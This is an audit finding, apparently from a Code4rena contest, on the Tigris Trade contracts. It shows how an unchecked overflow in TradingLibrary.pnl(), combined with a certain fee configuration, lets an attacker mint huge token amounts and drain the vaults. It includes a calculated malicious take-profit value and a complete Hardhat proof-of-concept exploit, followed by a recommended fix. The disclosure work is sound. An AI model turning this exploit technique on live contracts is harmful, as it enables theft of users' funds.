[H-03] Certain fee configuration enables vaults to be drained
Submitted byBobface
An overflow inTradingLibrary.pnl()enables all funds from the vault contracts to be drained given a certain fee configuration is present.
Detailed exploit process description
When opening a position, any value can be passed as take-profit price. This value is later used in the PNL calculation in anuncheckedblock. Setting this value specifically to attack the vault leads to theTradingcontract minting a huge (in the example below10^36) Tigris tokens, which can then be given to the vault to withdraw assets.
The exploiter starts by setting himself as referrer, in order to later receive the referrer fees.
The next step is to open a short position at the current market price by callinginitiateLimitOrder(). Here, the malicious value which will later bring the arithmetic to overflow is passed in as take-profit price. For the example below, the value has been calculated by hand to be115792089237316195423570985008687907854269984665640564039467for this specific market price, leverage and margin.
The order is then immediately executed throughexecuteLimitOrder().
The final step is to close the order throughlimitClose(), which will then mint over10^36Tigris tokens to the attacker.
Detailed bug description
The bug takes place inTradingLibrary.pnl(), line 46. The function is called during the process of closing the order to calculate the payout and position size. The malicious take-profit is passed as_currentPriceand the order’s original opening price is passed as_price. The take-profit has been specifically calculated so that1e18 * _currentPrice / _price - 1e18results in0, meaning_payout = _margin(accInterestis negligible for this PoC).
Line 48 then calculates the position size. Margin and leverage have been chosen so that_initPositionSize * _currentPricedoes not overflow, resulting in a huge_positionSizewhich is returned from the function.
Later,Trading._handleCloseFees()is called, under the condition that_payout > 0, which is why the overflow had to be calculated so precisely, as to not subtract from the_payoutbut still create a large_positionSize._positionSizeis passed in to this function, and it is used to calculate DAO and referral fees. Line 805 is what requires the specific fee configuration to be present, as otherwise this line would revert. The fees have to bedaoFees = 2*referralFees— not exactly, but close to this relationship. Then line 792 will set the DAO fees close to zero, while the hugereferralFeesare directly minted and not included in the calculation in line 805.
Recommended Mitigation Steps
The core issue is that the arithmetic inTradingLibrary.pnl()overflows. I recommend removing theuncheckedblock.
Proof of Concept
Insert the following code as test intotest/07.Trading.jsand run it withnpx hardhat test test/07.Trading.js:
describe("PoC",function() {it.only("PoC",asyncfunction() {// Setup token balances and approvalsconstmockDAI=awaitethers.getContractAt("MockERC20",MockDAI.address)awaitmockDAI.connect(owner).transfer(user.address,parseEther("10000"))awaitmockDAI.connect(user).approve(trading.address,parseEther("10000"))constpermitData= ["0","0","0","0x0000000000000000000000000000000000000000000000000000000000000000","0x0000000000000000000000000000000000000000000000000000000000000000",false]// Create referral codeawaitreferrals.connect(user).createReferralCode(ethers.constants.HashZero)// Set the feesawaittrading.connect(owner).setFees(false,// close"200000000",// dao"0",// burn"100000000",// referral"0",// bot"0",// percent)// ============================================================== //// =================== Create the limit order =================== //// ============================================================== //consttradeInfo= [parseEther("1"),// margin amountMockDAI.address,// margin assetStableVault.address,// stable vaultparseEther("2"),// leverage0,// asset idfalse,// direction (short)"115792089237316195423570985008687907854269984665640564039467",// take profit priceparseEther("0"),// stop loss priceethers.constants.HashZero// referral (ourself)];// Create the orderawaittrading.connect(user).initiateLimitOrder(tradeInfo,// trade info1,// order type (limit)parseEther("1000"),// pricepermitData,// permituser.address// trader)// ============================================================== //// =================== Execute the limit order ================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])awaitnetwork.provider.send("evm_mine")// Create the price dataletpriceData= [node.address,// provider0,// asset idparseEther("1000"),// price10000000,// spread (0.1%)(awaitethers.provider.getBlock()).timestamp,// timestampfalse// is closed]// Sign the price dataletmessage=ethers.utils.keccak256(ethers.utils.defaultAbiCoder.encode(['address','uint256','uint256','uint256','uint256','bool'],[priceData[0],priceData[1],priceData[2],priceData[3],priceData[4],priceData[5]]));letsig=awaitnode.signMessage(Buffer.from(message.substring(2),'hex'))// Execute the limit orderawaittrading.connect(user).executeLimitOrder(1,priceData,sig);// ============================================================== //// ======================== Close order  ======================== //// ============================================================== //// Wait for some blocks to pass the delayawaitnetwork.provider.send("evm_increaseTime", [10])awaitnetwork.provider.send("evm_mine")// Close orderawaittrading.connect(user).limitClose(1,// idtrue,// take profitpriceData,// price datasig,// signature)// Print resultsconstamount=awaitstabletoken.balanceOf(user.address)consttenPow18="1000000000000000000"console.log(`StableToken balance at end:${(amount/tenPow18).toString()}`)})})
TriHaz (Tigris Trade) confirmed
Alex the Entreprenerd (judge) commented:
In contrast to other reports that have some ambiguity, this report has shown a way to undercollateralize the vault and steal effectively all value.The Warden has shown how, by leveraginguncheckedmath and using injected-inputs, it’s possible to effectively mint an infinite amount of Stable Tokens.Mitigation will require ensuring that user provided inputs do not allow for overflows.
GainsGoblin (Tigris Trade) resolved:
Mitigation:https://github.com/code-423n4/2022-12-tigris/pull/2#issuecomment-1419173668